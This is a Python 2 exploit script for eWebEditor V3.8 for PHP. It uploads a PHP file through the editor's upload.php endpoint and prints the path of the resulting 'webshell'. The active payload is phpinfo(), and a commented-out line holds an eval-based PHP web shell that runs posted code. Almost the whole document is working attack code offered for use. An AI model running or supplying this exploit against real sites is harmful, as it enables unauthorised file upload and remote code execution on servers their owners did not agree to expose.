#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author:Tea
# Ewebeditor V3.8 For PHP GetWebshell

import sys
import regex
import requests


def main():
    if len(sys.argv) != 2:
        print 'Use: %s http://www.baidu.com/ewebeditor/' % sys.argv[0]
        sys.exit()
    getShell(sys.argv[1])


def getShell(vulUrl):
    reqHeaders = {
        'Referer': '%s' % (vulUrl),
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'
    }
    if vulUrl[-1] != '/':
        vulUrl += '/'
    reqUrl = '%s%s' % (vulUrl, 'php/upload.php?action=save&type=&style=mini&language=en')
    r = requests.post(reqUrl, files=createShellContent(), headers=reqHeaders)
    reqResult = r.text.encode('utf-8')
    # print reqResult
    getShellPath(reqResult)


def createShellContent():
    files = {
        'MAX_FILE_SIZE': (None, '512000'),
        # 'uploadfile': ('i.php', '<?php @eval($_POST[\'00\']);?>'),
        'uploadfile': ('i.php', '<?php phpinfo();?>')
    }
    return files


def getShellPath(resultContent):
    reStr = regex.compile('\/\w+\/\d+\/\d+\.\w+')
    shellUrl = regex.search(reStr, resultContent)[0]
    if shellUrl:
        print 'GetShell Success!'
        print '%s%s' % ('webShell:  ', shellUrl)
    else:
        print 'GetShell Failure!'


if __name__ == '__main__':
    main()
